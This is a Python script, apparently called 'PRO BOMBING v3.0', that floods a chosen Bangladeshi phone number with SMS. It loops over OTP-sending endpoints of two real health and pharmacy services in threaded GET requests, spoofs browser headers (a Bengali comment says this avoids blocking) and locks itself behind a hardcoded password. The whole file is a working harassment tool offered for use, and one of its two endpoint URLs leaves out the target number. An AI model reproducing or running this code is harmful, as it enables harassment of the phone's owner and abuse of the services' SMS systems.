import os, time, threading, requests

# --- Configuration ---
PASSWORD = "takbir0099"
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json',
    'Referer': 'https://google.com'
}

def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(r"""\033[1;32m
  ████████╗ █████╗ ██╗  ██╗██████╗ ██╗██████╗ 
  ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║██╔══██╗
     ██║   ███████║█████╔╝ ██████╔╝██║██████╔╝
     ██║   ██╔══██║██╔═██╗ ██╔══██╗██║██╔══██╗
     ██║   ██║  ██║██║  ██╗██████╔╝██║██║  ██╗
     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝
             Takbir Ahmed / PRO BOMBING v3.0
\033[0m""")

def password_prompt():
    print("\033[1;31m[!] Tool is locked.\033[0m")
    if input("Password: ") != PASSWORD:
        print("Wrong!"); exit()
    print("\033[1;32m[+] Access Granted!\033[0m")

counter = 0
lock = threading.Lock()

def update_counter():
    global counter
    with lock:
        counter += 1
        print(f"\033[1;36m[+ Sent Successfully] Total SMS: {counter}\033[0m")

def send_request(url):
    try:
        # এখানে Headers ব্যবহার করা হয়েছে ব্লক এড়াতে
        res = requests.get(url, headers=HEADERS, timeout=10)
        if res.status_code == 200:
            update_counter()
    except:
        pass

def start():
    banner()
    password_prompt()
    target = input("Target (01XXXXXXXXX): ")
    if len(target) != 11: print("Invalid!"); return
    
    number = target
    amount = int(input("Amount: "))
    
    api_list = [
        {"url": f"https://api.arogga.com/auth/v1/sms/send?f=mweb&b=&v=&os=&osv=&refPartner=", "method": "GET"},
        {"url": f"https://api.medeasy.health/api/send-otp/+88{number}/", "method": "GET"},
    ]

    print("\n\033[1;33m[!] Bombing Started...\033[0m")
    threads = []
    
    for _ in range(amount):
        for api in api_list:
            t = threading.Thread(target=send_request, args=(api['url'],))
            t.start()
            threads.append(t)
            time.sleep(0.2) # ওভারলোড এড়াতে সামান্য গ্যাপ

    for t in threads: t.join()
    print("\n\033[1;32m[✔] All Requests Completed!\033[0m")

if __name__ == "__main__":
    start()
